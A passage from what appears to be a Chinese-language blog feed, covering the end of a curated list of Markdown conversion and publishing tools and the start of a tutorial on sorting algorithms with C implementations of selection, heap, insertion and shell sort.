<h3 id="Markdown-Web-组件-自定义元素"><a href="#Markdown-Web-组件-自定义元素" class="headerlink" title="Markdown Web 组件 / 自定义元素"></a>Markdown Web 组件 / 自定义元素</h3><ul>
<li><a href="https://github.com/MarketingPipeline/Markdown-Tag">Markdown-Tag</a> - 使用 md 标签在任何网站上渲染 Markdown 到 HTML</li>
<li><a href=""><code>&lt;x-markdown&gt;</code></a> - 待完成</li>
</ul>
<h3 id="Markdown-转网站-博客"><a href="#Markdown-转网站-博客" class="headerlink" title="Markdown 转网站 / 博客"></a>Markdown 转网站 / 博客</h3><p><strong>Jekyll</strong><br>(web: <a href="http://jekyllrb.com">jekyllrb.com</a>, github: <a href="https://github.com/jekyll/jekyll">jekyll/jekyll :octocat:</a>, gem: <a href="https://rubygems.org/gems/jekyll">jekyll :gem:</a>) - 将你的纯文本转换为静态网站和博客（用 Ruby 编写）</p>
<p><strong>Middleman</strong><br>(web: <a href="https://middlemanapp.com">middlemanapp.com</a>, github: <a href="https://github.com/middleman/middleman">middleman/middleman :octocat:</a>, gem: <a href="https://rubygems.org/gems/middleman">middleman :gem:</a>) - 使网站开发变得简单（用 Ruby 编写）</p>
<p><strong>Slate</strong> (github: <a href="https://github.com/lord/slate">lord/slate :octocat:</a>) - 基于 <strong>Middleman</strong> 的美丽 API 文档</p>
<p><strong>Shins</strong> (github: <a href="https://github.com/Mermade/shins">Mermade/shins :octocat:</a>, npm: <a href="https://www.npmjs.com/package/shins">shins</a>) – 美丽的 API 文档，使用 node.js（<strong>Slate</strong> 的移植）</p>
<p><strong>md-fileserver</strong> (github: <a href="https://github.com/commenthol/md-fileserver">md-fileserver :octocat:</a>, npm: <a href="https://www.npmjs.com/package/md-fileserver">md-fileserver</a>) – 在浏览器中本地查看 markdown 文件。</p>
<p><strong>Compiiile</strong> (github: <a href="https://github.com/compiiile/compiiile">@compiiile/compiiile :octocat:</a>, npm: <a href="https://www.npmjs.com/package/@compiiile/compiiile">@compiiile/compiiile</a>) – 预览和提供包含 Markdown 文件的文件夹，支持全文搜索和演示幻灯片。</p>
<h3 id="Markdown-转电子邮件"><a href="#Markdown-转电子邮件" class="headerlink" title="Markdown 转电子邮件"></a>Markdown 转电子邮件</h3><p><strong>Markdown Here</strong><br>(web: <a href="http://markdown-here.com">markdown-here.com</a>, github: <a href="https://github.com/adam-p/markdown-here">adam-p/markdown-here</a>) - 一个浏览器扩展，用于渲染用 Markdown 编写的电子邮件；<br>适用于 Chrome、Firefox、Safari、Thunderbird 等；<br>除了电子邮件，还适用于 Evernote、Google Groups、Blogger 等</p>
<h3 id="Markdown-转演示文稿-幻灯片"><a href="#Markdown-转演示文稿-幻灯片" class="headerlink" title="Markdown 转演示文稿 / 幻灯片"></a>Markdown 转演示文稿 / 幻灯片</h3><p><strong>Slide Show (S9)</strong></p>
<ul>
<li>网站：<a href="http://slideshow-s9.github.io">slideshow-s9.github.io</a></li>
<li>GitHub：<a href="https://github.com/slideshow-s9">slideshow-s9/slideshow</a></li>
<li><p>Gem：<a href="https://rubygems.org/gems/slideshow">slideshow</a></p>
<ul>
<li>这是一个用 Ruby 编写的免费 Web 替代品，用于 PowerPoint 和 Keynote。</li>
</ul>
</li>
<li><p>模板 (GitHub：<a href="https://github.com/slideshow-templates">slideshow-templates</a>)</p>
</li>
</ul>
<p><strong>Slidev</strong></p>
<ul>
<li>GitHub：<a href="http://github.com/slidevjs/slidev">slidev</a><ul>
<li>Slidev 允许你从 Markdown 文件创建幻灯片。你可以在 Markdown 中包含 HTML 和 Vue 组件。</li>
</ul>
</li>
</ul>
<p><strong>Markpress</strong></p>
<ul>
<li>GitHub：<a href="https://github.com/gamell/markpress">markpress</a><ul>
<li>一个命令行工具和 Node 包，用于将 Markdown 文件转换为自包含的 <a href="https://github.com/impress/impress.js/">impressjs</a> HTML 演示文稿。<a href="https://gamell.github.io/markpress">示例</a></li>
</ul>
</li>
</ul>
<p><strong>nodePPT</strong></p>
<ul>
<li>GitHub：<a href="https://github.com/ksky521/nodePPT">nodePPT</a><ul>
<li>一个支持基于 GFM 的 Markdown 的 Web 演示工具。</li>
</ul>
</li>
</ul>
<p><strong>Deckset</strong></p>
<ul>
<li>网站：<a href="http://www.decksetapp.com">Deckset</a><ul>
<li>一款 macOS 桌面应用程序，可在精美设计的模板中呈现 Markdown 演示文稿。</li>
</ul>
</li>
</ul>
<p><strong>GitPitch</strong></p>
<ul>
<li>网站：<a href="http://gitpitch.com/">GitPitch</a></li>
<li>GitHub：<a href="https://github.com/gitpitch/gitpitch/">gitpitch</a><ul>
<li>在 GitHub、GitLab、Bitbucket、GitBucket、Gitea 和 Gogs 上为每个人提供 Markdown 演示文稿。<a href="https://gitpitch.com/gitpitch/gitpitch/master">示例</a></li>
</ul>
</li>
</ul>
<p><strong>zoetic</strong></p>
<ul>
<li>GitHub：<a href="https://github.com/kantord/zoetic">zoetic</a><ul>
<li>在演示时，使用你的网络摄像头作为背景的 Markdown 演示文稿。</li>
</ul>
</li>
</ul>
<h3 id="Markdown-转便携式文档格式-PDF"><a href="#Markdown-转便携式文档格式-PDF" class="headerlink" title="Markdown 转便携式文档格式 (PDF)"></a>Markdown 转便携式文档格式 (PDF)</h3><ul>
<li><a href="https://github.com/alanshaw/markdown-pdf">markdown-pdf</a><ul>
<li>一个将 Markdown 文件转换为 PDF 的工具。</li>
</ul>
</li>
</ul>
<h3 id="Markdown-样式-文档-页面"><a href="#Markdown-样式-文档-页面" class="headerlink" title="Markdown 样式 / 文档 / 页面"></a>Markdown 样式 / 文档 / 页面</h3><p><strong>页面设计的禅意</strong></p>
<ul>
<li>GitHub：<a href="https://github.com/pagedesigns">pagedesigns</a></li>
</ul>
<h3 id="Markdown-转书籍"><a href="#Markdown-转书籍" class="headerlink" title="Markdown 转书籍"></a>Markdown 转书籍</h3><p><strong>书籍设计的禅意</strong></p>
<ul>
<li>GitHub：<a href="https://github.com/bookdesigns">bookdesigns</a></li>
</ul>
<p><strong>Hyper Book (H9)</strong></p>
<ul>
<li>GitHub：<a href="https://github.com/hybook">hybook</a></li>
<li>Gem：<a href="https://rubygems.org/gems/hybook">hybook</a><ul>
<li><a href="https://github.com/book-templates">模板</a></li>
</ul>
</li>
</ul>
<h3 id="Markdown-转目录-TOC"><a href="#Markdown-转目录-TOC" class="headerlink" title="Markdown 转目录 (TOC)"></a>Markdown 转目录 (TOC)</h3><ul>
<li><strong>使用 <a href="https://github.com/jonschlinkert/remarkable">remarkable</a> 生成 Markdown 目录 (TOC)</strong><ul>
<li>GitHub：<a href="https://github.com/jonschlinkert/markdown-toc">markdown-toc</a></li>
</ul>
</li>
<li><a href="#markedpp">markedpp</a> Markdown 到 Markdown 预处理器</li>
<li><a href="https://github.com/tallclair/mdtoc">mdtoc</a><ul>
<li>为 CI 设计的独立 TOC 生成器</li>
</ul>
</li>
</ul>
<h3 id="Markdown-到-Markdown-预处理器"><a href="#Markdown-到-Markdown-预处理器" class="headerlink" title="Markdown 到 Markdown 预处理器"></a>Markdown 到 Markdown 预处理器</h3><ul>
<li><strong>markedpp</strong><ul>
<li>GitHub：<a href="https://github.com/commenthol/markedpp">markedpp</a></li>
<li>添加对目录 (TOC)、编号标题、包含其他 Markdown 文件和/或创建引用列表的支持，适用于不同的 Markdown 处理器，如 <a href="#marked">marked</a>、<a href="#markdown-it">markdown-it</a>、<a href="#pandoc">pandoc</a>，或用于在 github.com、gitlab.com、bitbucket.org 或 ghost.org 上托管。</li>
</ul>
</li>
</ul>
<h2 id="转换为-Markdown-的工具"><a href="#转换为-Markdown-的工具" class="headerlink" title="转换为 Markdown 的工具"></a>转换为 Markdown 的工具</h2><h3 id="Microsoft-Word-转-Markdown"><a href="#Microsoft-Word-转-Markdown" class="headerlink" title="Microsoft Word 转 Markdown"></a>Microsoft Word 转 Markdown</h3><ul>
<li><a href="https://github.com/benbalter/word-to-markdown">word-to-markdown gem</a><ul>
<li>Gem：<a href="https://rubygems.org/gems/word-to-markdown">word-to-markdown</a></li>
<li>从 Microsoft Word 文档的“监狱”中“解放”内容；转换为纯文本 Markdown。</li>
</ul>
</li>
</ul>
<h3 id="超文本标记语言-HTML-转-Markdown"><a href="#超文本标记语言-HTML-转-Markdown" class="headerlink" title="超文本标记语言 (HTML) 转 Markdown"></a>超文本标记语言 (HTML) 转 Markdown</h3><h4 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h4><ul>
<li><a href="https://github.com/xijo/reverse_markdown">reverse_markdown</a><ul>
<li>Gem：<a href="https://rubygems.org/gems/reverse_markdown">reverse_markdown</a></li>
<li>将简单的 HTML 映射回 Markdown。</li>
</ul>
</li>
<li><a href="https://github.com/29decibel/html2markdown">html2markdown</a><ul>
<li>Gem：<a href="https://rubygems.org/gems/html2markdown">html2markdown</a></li>
<li>简单且灵活的 HTML 到 Markdown 转换器。</li>
</ul>
</li>
<li><a href="https://github.com/jcheatham/hypertextmarkdown">hypertextmarkdown</a><ul>
<li>Gem：<a href="https://rubygems.org/gems/hypertextmarkdown">hypertextmarkdown</a></li>
<li>HTML 到 Markdown 转换器。</li>
</ul>
</li>
<li><a href="https://github.com/pmorton/html2md">html2md</a><ul>
<li>Gem：<a href="https://rubygems.org/gems/html2md">html2md</a></li>
<li>转换基本的 HTML 到 Markdown。</li>
</ul>
</li>
<li><a href="https://github.com/soffes/unmarkdown">unmarkdown</a><ul>
<li>Gem：<a href="https://rubygems.org/gems/unmarkdown">unmarkdown</a></li>
<li>转换 HTML 到 Markdown。</li>
</ul>
</li>
<li><a href="https://github.com/conversation/upmark">upmark</a><ul>
<li>Gem：<a href="https://rubygems.org/gems/upmark">upmark</a></li>
<li>一个 HTML 到 Markdown 转换器。</li>
</ul>
</li>
<li><a href="https://github.com/mislav/remark">remark</a><ul>
<li>用 Ruby 编写的 HTML 到 Markdown 转换器。</li>
</ul>
</li>
</ul>
<h4 id="JavaScript-Node-js"><a href="#JavaScript-Node-js" class="headerlink" title="JavaScript / Node.js"></a>JavaScript / Node.js</h4><ul>
<li><a href="https://github.com/domchristie/turndown">turndown</a><ul>
<li>npm 包：<a href="https://www.npmjs.com/package/turndown">turndown</a></li>
<li>演示网站：<a href="http://domchristie.github.io/turndown/">turndown</a></li>
<li>用 JavaScript 编写的 HTML 到 Markdown 转换器（以前称为 <code>to-markdown</code>）。</li>
</ul>
</li>
<li><a href="https://github.com/alexgorbatchev/html2markdown">html2markdown</a><ul>
<li>npm 包：<a href="https://www.npmjs.com/package/html2markdown">html2markdown</a></li>
<li>转换 HTML 到 Markdown。</li>
</ul>
</li>
<li><a href="http://markitdown.medusis.com">Markitdown</a><ul>
<li>一个客户端 Web 应用程序，允许你粘贴来自网页的格式化文本（例如，链接保持完整）并接收 Markdown 输出。</li>
<li>GitHub：<a href="https://github.com/bambax/markitdown.medusis.com">Markitdown.medusis.com</a></li>
<li>一个用于将富文本转换为 Markdown 的客户端 Web 应用程序。</li>
</ul>
</li>
</ul>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
<li><a href="http://heckyesmarkdown.com">heckyesmarkdown.com</a><ul>
<li>立即转换网页为 Markdown；该服务提供了一个简单的界面，将任何合理的网页转换为 Markdown（注意：该服务似乎使用 Readability API 从源页面中删除所有非内容的多余部分，然后再进行 Markdown 转换）。</li>
</ul>
</li>
</ul>
<h3 id="源代码转-Markdown"><a href="#源代码转-Markdown" class="headerlink" title="源代码转 Markdown"></a>源代码转 Markdown</h3><p>从源代码生成 API 文档的 Markdown，然后使用许多 <a href="#markdown-to-website--blog">Markdown 转网站</a> 工具之一将其托管和提供服务。</p>
<ul>
<li><a href="https://github.com/Mermade/widdershins">widdershins</a><ul>
<li>将 <a href="https://www.openapis.org">OpenAPI/Swagger</a> REST API 文档转换为 Markdown。</li>
</ul>
</li>
<li><a href="https://github.com/sourcey/moxygen">Moxygen</a><ul>
<li>将 <a href="http://www.stack.nl/~dimitri/doxygen/">Doxygen</a>（C++，但也支持其他流行的编程语言，如 C、Objective-C、C#、PHP、Java、Python、IDL、Fortran、VHDL、Tcl，以及在一定程度上支持 D）文档转换为 Markdown。</li>
</ul>
</li>
<li><a href="https://github.com/raml2html/markdown-theme">raml2html/markdown-theme</a><ul>
<li>使用 raml2html 将 <a href="http://raml.org">RAML</a> REST API 文档转换为 Markdown。</li>
</ul>
</li>
<li><a href="https://github.com/jsdoc2md/jsdoc-to-markdown">jsdoc-to-markdown</a><ul>
<li>通过 JSDoc 将 JavaScript API 文档转换为 Markdown。</li>
</ul>
</li>
<li><a href="https://github.com/albinotonnina/mmarkdown">mmarkdown</a><ul>
<li>解释 Markdown 文件中的 mmd 代码块，并生成更酷的版本。</li>
</ul>
</li>
<li><a href="https://gitlab.com/alex20465/markpush">markpush</a><ul>
<li>Firefox/Chrome 扩展，以可读的 Markdown 格式推送 Git 仓库中的文章。</li>
</ul>
</li>
</ul>
<h3 id="技术文档转-Markdown"><a href="#技术文档转-Markdown" class="headerlink" title="技术文档转 Markdown"></a>技术文档转 Markdown</h3><ul>
<li><a href="https://github.com/jelovirt/dita-ot-markdown">dita-ot-markdown</a> – 将 DITA 转换为 Markdown，并与标准 DITA OT 工具链集成</li>
</ul>
<h3 id="屏幕录像转-Markdown"><a href="#屏幕录像转-Markdown" class="headerlink" title="屏幕录像转 Markdown"></a>屏幕录像转 Markdown</h3><ul>
<li><a href="https://paircast.io">Paircast</a> - 将桌面视频、git 差异和语音转录整合成 Markdown 文档。</li>
</ul>
<h3 id="JSON-转-Markdown"><a href="#JSON-转-Markdown" class="headerlink" title="JSON 转 Markdown"></a>JSON 转 Markdown</h3><p>JavaScript / Node.js</p>
<ul>
<li><a href="https://github.com/IonicaBizau/json2md">json2md</a> - 一个 JSON 到 Markdown 的转换器。</li>
<li><a href="https://github.com/kgar/ts-markdown">ts-markdown</a> - 一个可扩展的 TypeScript Markdown 生成器，它接受 JSON 并创建 Markdown 文档。</li>
</ul>
<h2 id="出版服务"><a href="#出版服务" class="headerlink" title="出版服务"></a>出版服务</h2><ul>
<li><a href="https://www.softcover.io">Softcover.io</a> - 由 Michael Hartl 等人提供的命令行出版工具<ul>
<li><a href="https://github.com/softcover/softcover">Softcover</a> - 书籍生成、构建和发布的命令行工具</li>
<li><a href="https://rubygems.org/gems/softcover">RubyGems</a> - RubyGems 上的 Softcover 包</li>
</ul>
</li>
<li><a href="https://www.gitbook.com">GitBook.com</a> - 使用 Markdown 和 Git 编写和发布书籍，由 Samy Pessé 等人提供<ul>
<li><a href="https://github.com/GitbookIO/gitbook">GitBook</a> - 使用 GitHub/Git 和 Markdown（或 AsciiDoc）构建精美书籍的命令行工具（和 Node.js 库）</li>
</ul>
</li>
</ul>
<!-- break -->
<ul>
<li><a href="https://github.com/bitbooks">Bitbooks.cc (已停止；已存档)</a> - Bitbooks 将包含 Markdown 文件的仓库转换为美观的、托管的在线书籍 - 由 Bryan Braun 提供<ul>
<li><a href="https://github.com/bryanbraun/franklin">Franklin</a> - 为在线书籍优化的静态网站框架</li>
</ul>
</li>
</ul>
<h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ul>
<li><a href="http://ericholscher.com/blog/2016/mar/15/dont-use-markdown-for-technical-docs">为什么你不应该使用 Markdown 编写文档</a> - Eric Holscher，2016 年 3 月</li>
<li><a href="https://mister-gold.pro/posts/en/asciidoc-vs-markdown/">停止使用 Markdown 编写文档</a> - Anton Zolotukhin，2018 年 4 月</li>
<li><a href="http://roopc.net/posts/2014/markdown-cfg">为什么 Markdown 没有正式语法？</a> - Roopesh Chander，2014 年 9 月</li>
<li><a href="https://medium.com/towards-data-science/the-ultimate-markdown-cheat-sheet-3d3976b31a0">终极 Markdown 速查表</a></li>
</ul>
<!--more-->]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>全面内部外部排序算法总结C语言</title>
    <url>/2025/01/23/algorithms/</url>
    <content><![CDATA[<h1 id="排序算法总结"><a href="#排序算法总结" class="headerlink" title="排序算法总结"></a>排序算法总结</h1><ul>
<li>排序算法是《数据结构与算法》中最基本的算法之一。</li>
<li>排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。</li>
<li>常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。</li>
</ul>
<p><img src="/algorithms/20250121145229.png" alt=""></p>
<hr>
<blockquote>
<ol>
<li>排序：所谓排序，就是使一串记录，按照其中的某个或某些关键字的大小，递增或递减的排列起来的操作。</li>
<li>稳定性：假定在待排序的记录序列中，存在多个具有相同的关键字的记录，若经过排序，这些记录的相对次 序保持不变，即在原序列中，r[i]=r[j]，且r[i]在r[j]之前，而在排序后的序列中，r[i]仍在r[j]之前，则称这种排 序算法是稳定的；否则称为不稳定的。</li>
<li>内部排序：数据元素全部放在内存中的排序。</li>
<li>外部排序：数据元素太多不能同时放在内存中，根据排序过程的要求不能在内外存之间移动数据的排序。</li>
</ol>
</blockquote>
<span id="more"></span>
<h2 id="内部排序"><a href="#内部排序" class="headerlink" title="内部排序"></a>内部排序</h2><p><img src="/algorithms/20250121145323.png" alt=""></p>
<p><img src="/algorithms/20250121144412.png" alt=""></p>
<h3 id="（一）选择排序"><a href="#（一）选择排序" class="headerlink" title="（一）选择排序"></a>（一）选择排序</h3><h4 id="直接选择排序"><a href="#直接选择排序" class="headerlink" title="直接选择排序"></a>直接选择排序</h4><p>选择排序是一种简单直观的排序算法，无论什么数据进去都是 O(n²) 的时间复杂度。所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。</p>
<h5 id="1-算法步骤"><a href="#1-算法步骤" class="headerlink" title="1. 算法步骤"></a>1. 算法步骤</h5><ul>
<li><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。</p>
</li>
<li><p>再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。</p>
</li>
<li><p>重复第二步，直到所有元素均排序完毕。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> *b)</span> <span class="comment">//交換兩個變數</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">selection_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; len - <span class="number">1</span> ; i++) </span><br><span class="line">    &#123;</span><br><span class="line">                <span class="type">int</span> min = i;</span><br><span class="line">                <span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; len; j++)     <span class="comment">//走訪未排序的元素</span></span><br><span class="line">                        <span class="keyword">if</span> (arr[j] &lt; arr[min])    <span class="comment">//找到目前最小值</span></span><br><span class="line">                                min = j;    <span class="comment">//紀錄最小值</span></span><br><span class="line">                swap(&amp;arr[min], &amp;arr[i]);    <span class="comment">//做交換</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-动图演示"><a href="#2-动图演示" class="headerlink" title="2. 动图演示"></a>2. 动图演示</h5><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/selectionSort.gif" alt=""></p>
<h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。堆排序可以说是一种利用堆的概念来排序的选择排序。分为两种方法：</p>
<ul>
<li>大顶堆：每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列；</li>
<li>小顶堆：每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列；<br>堆排序的平均时间复杂度为 Ο(nlogn)。<h5 id="1-算法步骤-1"><a href="#1-算法步骤-1" class="headerlink" title="1. 算法步骤"></a>1. 算法步骤</h5></li>
<li><p>创建一个堆 H[0……n-1]；</p>
</li>
<li><p>把堆首（最大值）和堆尾互换；</p>
</li>
<li><p>把堆的尺寸缩小 1，并调用 shift_down(0)，目的是把新的数组顶端数据调整到相应位置；</p>
</li>
<li><p>重复步骤 2，直到堆的尺寸为 1。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> temp = *b;</span><br><span class="line">    *b = *a;</span><br><span class="line">    *a = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">max_heapify</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="comment">// 建立父節點指標和子節點指標</span></span><br><span class="line">    <span class="type">int</span> dad = start;</span><br><span class="line">    <span class="type">int</span> son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (son &lt;= end) &#123; <span class="comment">// 若子節點指標在範圍內才做比較</span></span><br><span class="line">        <span class="keyword">if</span> (son + <span class="number">1</span> &lt;= end &amp;&amp; arr[son] &lt; arr[son + <span class="number">1</span>]) <span class="comment">// 先比較兩個子節點大小，選擇最大的</span></span><br><span class="line">            son++;</span><br><span class="line">        <span class="keyword">if</span> (arr[dad] &gt; arr[son]) <span class="comment">//如果父節點大於子節點代表調整完畢，直接跳出函數</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 否則交換父子內容再繼續子節點和孫節點比較</span></span><br><span class="line">            swap(&amp;arr[dad], &amp;arr[son]);</span><br><span class="line">            dad = son;</span><br><span class="line">            son = dad * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">heap_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="comment">// 初始化，i從最後一個父節點開始調整</span></span><br><span class="line">    <span class="keyword">for</span> (i = len / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        max_heapify(arr, i, len - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 先將第一個元素和已排好元素前一位做交換，再重新調整，直到排序完畢</span></span><br><span class="line">    <span class="keyword">for</span> (i = len - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        swap(&amp;arr[<span class="number">0</span>], &amp;arr[i]);</span><br><span class="line">        max_heapify(arr, <span class="number">0</span>, i - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> arr[] = &#123; <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span> &#125;;</span><br><span class="line">    <span class="type">int</span> len = (<span class="type">int</span>) <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(*arr);</span><br><span class="line">    heap_sort(arr, len);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-动图演示-1"><a href="#2-动图演示-1" class="headerlink" title="2. 动图演示"></a>2. 动图演示</h5><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/heapSort.gif" alt=""></p>
<p><img src="https://www.runoob.com/wp-content/uploads/2019/03/Sorting_heapsort_anim.gif" alt=""></p>
<h3 id="（二）插入排序"><a href="#（二）插入排序" class="headerlink" title="（二）插入排序"></a>（二）插入排序</h3><h4 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h4><p>插入排序的代码实现虽然没有冒泡排序和选择排序那么简单粗暴，但它的原理应该是最容易理解的了，因为只要打过扑克牌的人都应该能够秒懂。插入排序是一种最简单直观的排序算法，它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p>
<p>插入排序和冒泡排序一样，也有一种优化算法，叫做拆半插入。</p>
<h5 id="1-算法步骤-2"><a href="#1-算法步骤-2" class="headerlink" title="1. 算法步骤"></a>1. 算法步骤</h5><ul>
<li><p>将第一待排序序列第一个元素看做一个有序序列，把第二个元素到最后一个元素当成是未排序序列。</p>
</li>
<li><p>从头到尾依次扫描未排序序列，将扫描到的每个元素插入有序序列的适当位置。（如果待插入的元素与有序序列中的某个元素相等，则将待插入元素插入到相等元素的后面。）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insertion_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span>&#123;</span><br><span class="line">        <span class="type">int</span> i,j,key;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">                key = arr[i];</span><br><span class="line">                j=i<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">while</span>((j&gt;=<span class="number">0</span>) &amp;&amp; (arr[j]&gt;key)) &#123;</span><br><span class="line">                        arr[j+<span class="number">1</span>] = arr[j];</span><br><span class="line">                        j--;</span><br><span class="line">                &#125;</span><br><span class="line">                arr[j+<span class="number">1</span>] = key;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-动图演示-2"><a href="#2-动图演示-2" class="headerlink" title="2. 动图演示"></a>2. 动图演示</h5><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/insertionSort.gif" alt=""></p>
<h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><p>希尔排序，也称递减增量排序算法，是插入排序的一种更高效的改进版本。但希尔排序是非稳定排序算法。</p>
</li>
</ul>
<p>希尔排序是基于插入排序的以下两点性质而提出改进方法的：</p>
<ul>
<li>插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；</li>
<li>但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位；</li>
</ul>
<p>希尔排序的基本思想是：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录”基本有序”时，再对全体记录进行依次直接插入排序。</p>
<h5 id="1-算法步骤-3"><a href="#1-算法步骤-3" class="headerlink" title="1. 算法步骤"></a>1. 算法步骤</h5><ul>
<li><p>选择一个增量序列 t1，t2，……，tk，其中 ti &gt; tj, tk = 1；</p>
</li>
<li><p>按增量序列个数 k，对序列进行 k 趟排序；</p>
</li>
<li><p>每趟排序，根据对应的增量 ti，将待排序列分割成若干长度为 m 的子序列，分别对各子表进行直接插入排序。仅增量因子为 1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">shell_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> len)</span> &#123;</span><br><span class="line">        <span class="type">int</span> gap, i, j;</span><br><span class="line">        <span class="type">int</span> temp;</span><br><span class="line">        <span class="keyword">for</span> (gap = len &gt;&gt; <span class="number">1</span>; gap &gt; <span class="number">0</span>; gap &gt;&gt;= <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">for</span> (i = gap; i &lt; len; i++) &#123;</span><br><span class="line">                        temp = arr[i];</span><br><span class="line">                        <span class="keyword">for</span> (j = i - gap; j &gt;= <span class="number">0</span> &amp;&amp; arr[j] &gt; temp; j -= gap)</span><br><span class="line">                                arr[j + gap] = arr[j];</span><br><span class="line">                        arr[j + gap] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
